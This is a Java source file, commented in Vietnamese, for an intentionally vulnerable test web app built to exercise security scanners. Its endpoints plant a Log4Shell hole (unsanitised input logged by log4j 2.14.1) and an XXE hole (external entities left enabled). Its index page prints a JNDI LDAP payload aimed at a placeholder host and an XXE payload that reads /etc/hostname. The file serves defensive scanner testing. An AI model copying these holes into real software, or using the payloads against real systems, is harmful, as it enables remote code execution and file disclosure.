package com.vulntest;

/**
 * VULN-JAVA-APP
 * Ứng dụng CỐ Ý chứa lỗ hổng để test công cụ scan (SCA/DAST).
 * KHÔNG deploy ra môi trường thật / internet công cộng.
 *
 * Gồm 2 lỗ hổng chính:
 *  1. [CVE-2021-44228 - Log4Shell] log4j-core 2.14.1: log user-controlled input
 *     bằng logger.error(...) mà không sanitize -> cho phép JNDI lookup injection.
 *  2. [CWE-611 - XXE] parser XML không tắt DOCTYPE/external entity.
 */

import com.sun.net.httpserver.HttpServer;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.w3c.dom.Document;
import org.xml.sax.InputSource;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import java.io.*;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.util.stream.Collectors;

public class App {

    private static final Logger logger = LogManager.getLogger(App.class);

    public static void main(String[] args) throws IOException {
        int port = 8080;
        HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);

        server.createContext("/", new IndexHandler());
        server.createContext("/api/log", new LogHandler());     // Log4Shell
        server.createContext("/api/xxe", new XxeHandler());     // XXE

        server.setExecutor(null);
        server.start();
        System.out.println("vuln-java-app listening on port " + port);
    }

    static String readBody(HttpExchange ex) throws IOException {
        try (BufferedReader br = new BufferedReader(new InputStreamReader(ex.getRequestBody(), StandardCharsets.UTF_8))) {
            return br.lines().collect(Collectors.joining("\n"));
        }
    }

    static void send(HttpExchange ex, int code, String body) throws IOException {
        byte[] bytes = body.getBytes(StandardCharsets.UTF_8);
        ex.sendResponseHeaders(code, bytes.length);
        try (OutputStream os = ex.getResponseBody()) {
            os.write(bytes);
        }
    }

    static class IndexHandler implements HttpHandler {
        public void handle(HttpExchange ex) throws IOException {
            String html = "<h1>Vuln Java App</h1>"
                + "<ul>"
                + "<li>Log4Shell (CVE-2021-44228): gửi header <code>X-Api-Version</code> "
                + "hoặc query <code>?input=</code> chứa chuỗi <code>${jndi:ldap://HOST:PORT/a}</code> "
                + "tới <code>GET /api/log</code></li>"
                + "<li>XXE (CWE-611): <code>POST /api/xxe</code> với body là XML, "
                + "vd &lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE r [&lt;!ENTITY x SYSTEM \"file:///etc/hostname\"&gt;]&gt;&lt;r&gt;&amp;x;&lt;/r&gt;</li>"
                + "</ul>";
            send(ex, 200, html);
        }
    }

    // -----------------------------------------------------------------
    // [CVE-2021-44228] Log4Shell: input người dùng được log trực tiếp
    // Log4j 2.x <= 2.14.1 sẽ tự động thực hiện JNDI lookup nếu message
    // chứa pattern ${jndi:...}, dẫn tới RCE khi kết nối tới LDAP/RMI server độc hại.
    // -----------------------------------------------------------------
    static class LogHandler implements HttpHandler {
        public void handle(HttpExchange ex) throws IOException {
            String query = ex.getRequestURI().getQuery();
            String input = "";
            if (query != null) {
                for (String kv : query.split("&")) {
                    String[] parts = kv.split("=", 2);
                    if (parts.length == 2 && parts[0].equals("input")) {
                        input = java.net.URLDecoder.decode(parts[1], "UTF-8");
                    }
                }
            }
            String uaHeader = ex.getRequestHeaders().getFirst("X-Api-Version");
            if (uaHeader != null) {
                input = uaHeader; // header cũng được log không kiểm tra
            }

            // VULNERABLE SINK: input chưa được sanitize được truyền thẳng vào logger
            logger.error("Received request with input: {}", input);

            send(ex, 200, "logged: " + input);
        }
    }

    // -----------------------------------------------------------------
    // [CWE-611] XXE: DocumentBuilderFactory không tắt DOCTYPE / external entities
    // -----------------------------------------------------------------
    static class XxeHandler implements HttpHandler {
        public void handle(HttpExchange ex) throws IOException {
            if (!"POST".equalsIgnoreCase(ex.getRequestMethod())) {
                send(ex, 405, "Method Not Allowed");
                return;
            }
            String xml = readBody(ex);
            try {
                DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
                // VULNERABLE CONFIG: không set các feature sau (đáng lẽ phải tắt):
                // dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
                // dbf.setExpandEntityReferences(false);
                DocumentBuilder builder = dbf.newDocumentBuilder();
                Document doc = builder.parse(new InputSource(new StringReader(xml)));
                String result = doc.getDocumentElement().getTextContent();
                send(ex, 200, "parsed: " + result);
            } catch (Exception e) {
                send(ex, 400, "error: " + e.getMessage());
            }
        }
    }
}
